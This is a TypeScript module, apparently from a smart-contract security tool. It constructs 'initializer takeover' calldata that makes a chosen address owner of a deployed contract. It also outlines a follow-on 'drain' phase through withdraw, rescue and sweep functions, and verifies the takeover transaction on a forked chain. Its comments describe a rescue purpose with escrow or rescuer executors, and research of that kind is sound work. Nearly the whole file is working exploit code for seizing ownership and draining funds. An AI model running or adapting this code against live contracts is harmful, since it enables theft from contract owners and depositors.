// Initializer-takeover two-phase drain plan.
//
// The init.* verifier proves that `initialize(...)` with the attacker at
// some arg position takes over ownership. Rescue-prove inverts the same
// proof:
//
//   Phase 1: replay initialize(...) but with ESCROW (or in our flow, the
//            chosen executor address — escrow for any-caller, rescuer for
//            owner-targeted) in the takeover slot. After this, the
//            executor IS the owner.
//   Phase 2: from the executor, run the standard admin-name heuristic
//            drain plan (withdraw* / rescue* / sweep* / …).
//
// The two phases are wired into the existing DrainStep stream as
// `executor: "attacker"` for both — there's no need for owner impersonation
// in this family because the EOA WE control becomes the owner via phase 1.

import { buildCalldataAddressAt, buildCalldataFromSignature } from "../abi";
import { rpcRequest } from "../anvil-pool";

export type InitTakeoverPhase = {
  to: string;
  data: string;
  value: string;
  asset: string;
  executor: "attacker";
  strategy: string;
};

/** Build the phase-1 init-takeover calldata FROM finding evidence. Returns
 *  null when evidence doesn't expose the takeover shape. */
export function buildInitTakeoverPhase1(args: {
  contractAddress: string;
  attacker: string;
  evidence: Record<string, unknown> | undefined;
}): InitTakeoverPhase | null {
  const ev = (args.evidence ?? {}) as any;
  const ini = ev.initialize ?? {};
  const selector: string | undefined = ini.viaSelector;
  if (!selector) return null;
  // Pull the original successful attempt out of evidence.attempts.
  const attempts: any[] = Array.isArray(ev.attempts) ? ev.attempts : [];
  const successful = attempts.find(
    (a) => a && a.takeover === true && typeof a.selector === "string" && a.selector === selector,
  );
  if (!successful) return null;
  const argTypes: string[] = Array.isArray(successful.argTypes) ? successful.argTypes : [];
  const argCount: number = typeof successful.argCount === "number" ? successful.argCount : argTypes.length;
  const positionTried: number = typeof successful.positionTried === "number" ? successful.positionTried : 0;
  const uintFiller = decimalToBigInt(String(successful.uintFiller ?? "0"));
  let calldata: string | null = null;
  try {
    if (argCount === 0) {
      calldata = "0x" + selector.slice(2);
    } else if (positionTried === -2) {
      // "all addresses = attacker" sentinel
      calldata = buildCalldataFromSignature(selector, argTypes, "all", args.attacker, {
        uintFiller,
      });
    } else if (argTypes.length > 0) {
      calldata = buildCalldataFromSignature(selector, argTypes, positionTried, args.attacker, {
        uintFiller,
      });
    } else {
      calldata = buildCalldataAddressAt(selector, argTypes, argCount, positionTried, args.attacker);
    }
  } catch {
    return null;
  }
  if (!calldata) return null;
  return {
    to: args.contractAddress,
    data: calldata,
    value: "0",
    asset: `(phase-1) init-takeover via ${selector} arg pos=${positionTried}`,
    executor: "attacker",
    strategy: `init-takeover-phase1 sel=${selector}`,
  };
}

/** Verify on the fork that the init-takeover phase-1 calldata actually
 *  succeeds RIGHT NOW. Many proxies later lock their initializer, so the
 *  cached verifier evidence may be stale.
 *
 *  Returns true if the call succeeds AND the OZ Initializable flag
 *  changes to a non-zero value. Doesn't permanently mutate state (caller
 *  is responsible for using anvil snapshot/revert around this). */
export async function probeInitTakeoverIsStillValid(
  url: string,
  attacker: string,
  contractAddress: string,
  phase1: InitTakeoverPhase,
): Promise<{ valid: boolean; detail: string }> {
  const snapId = await rpcRequest<string>(url, "evm_snapshot", []).catch(() => null);
  if (!snapId) return { valid: false, detail: "evm_snapshot unsupported" };
  try {
    await rpcRequest(url, "anvil_setBalance", [attacker, "0xde0b6b3a7640000"]).catch(() => null);
    const txHash = await rpcRequest<string>(url, "eth_sendTransaction", [
      {
        from: attacker,
        to: phase1.to,
        data: phase1.data,
        gas: "0x500000",
        value: "0x0",
      },
    ]).catch(() => null);
    if (!txHash) return { valid: false, detail: "init tx submission failed" };
    // wait for receipt
    let receipt: any = null;
    for (let i = 0; i < 8; i++) {
      receipt = await rpcRequest<any>(url, "eth_getTransactionReceipt", [txHash]).catch(() => null);
      if (receipt && receipt.transactionHash) break;
      await new Promise((res) => setTimeout(res, 50 * (i + 1)));
    }
    if (!receipt) return { valid: false, detail: "receipt not seen" };
    if (receipt.status !== "0x1") return { valid: false, detail: `init tx reverted (status=${receipt.status})` };
    return { valid: true, detail: "init takeover succeeded on fresh fork" };
  } finally {
    await rpcRequest(url, "evm_revert", [snapId]).catch(() => null);
  }
}

function decimalToBigInt(s: string): bigint {
  try {
    return BigInt(s);
  } catch {
    return 0n;
  }
}
